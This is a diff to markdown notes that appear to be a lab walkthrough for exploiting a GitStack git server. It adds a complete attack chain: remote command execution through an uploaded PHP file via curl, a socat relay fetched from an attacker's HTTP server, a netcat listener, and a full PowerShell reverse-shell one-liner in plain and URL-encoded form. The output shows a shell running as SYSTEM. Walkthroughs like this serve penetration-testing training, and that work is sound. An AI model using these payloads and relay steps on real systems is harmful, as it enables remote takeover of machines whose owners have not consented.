@@ -460,7 +460,7 @@ Code review steps
   * modify \exploit.php to point to \exploit-username.php at the end of the file in two places
 
 # Task 20 - git server exploitation
-Run exploit
+## Run exploit
 * Run the modified exploit
   ```
   .[exploit].py 
@@ -477,3 +477,76 @@ Run exploit
   "nt authority\system
   " 
   ```
+* With the exploit code uploaded, you can use curl to run remote commands, example:
+  ```
+  curl -X POST http://localhost:32080/web/exploit-[username].php -d "a=whoami" 
+  "nt authority\system                                                     
+  "                                                   
+  ```
+* Enumerate the host and find basic info
+
+## Setup a relay
+* attacker: setup a listener with netcat
+  ```
+  nc -nvlp 3333
+  listening on [any] 3333 ...
+  ```
+* relay host: setup a relay with socat
+  * download latest socat release http://www.dest-unreach.org/socat/
+  * compile code
+    * gunzip file
+    * tar -xvf file
+    * cd dir
+    * ./configure
+    * make
+    * make install
+    * ./socat -h
+  * copy socat-[username] to the /tmp dir on the relay host
+    * attacker: sudo python3 -m http.server 80
+    * relay host: curl http://[attacker_ip]/socat-[username] -O /tmp/socat-[username]
+    * relay host: chmod +x /tmp/socat-[username]
+  * open port on relay host to catch reverse shell from the target to relay to the attacker
+    ```
+    firewall-cmd --zone=public --add-port 32081/tcp
+    success
+    ```
+  * open socat relay on relay host
+    ```
+    ./socat-[username] tcp-l:32081 tcp:10.50.99.2:3333 &
+    [2] 5361
+    ```
+* target host: using the original exploit that allows us to run any command, we will execute a powershell script that creates a reverse shell to the relay host which then connects back to the attack box
+  * powershell script, modify IP and PORT
+    ```
+    powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    ```
+  * use URL encoder to encode the powershell script so we can pass the payload via curl
+    * https://www.urlencoder.org/
+    ```
+    powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.98.200%27
+    %2C32081%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes
+    %2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B
+    %24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%
+    20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Fl
+    ush%28%29%7D%3B%24client.Close%28%29%22
+    ```
+  * use curl to execute the payload through the exploitable php module that runs any command, prefix your encoded powershell script with a=
+    ```
+    curl -X POST -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.98.200%27
+    %2C32081%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes
+    %2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B
+    %24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%
+    20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Fl
+    ush%28%29%7D%3B%24client.Close%28%29%22" http://localhost:32080/web/exploit-[username].php
+    "<br />
+    ```
+## Catching the shell
+If all goes well, you should catch the shell through the relay on the attack box
+```
+nc -nvlp 3333
+listening on [any] 3333 ...
+connect to [10.50.99.2] from (UNKNOWN) [10.200.98.200] 50108
+
+PS C:\GitStack\gitphp> whoami
+nt authority\system
+```
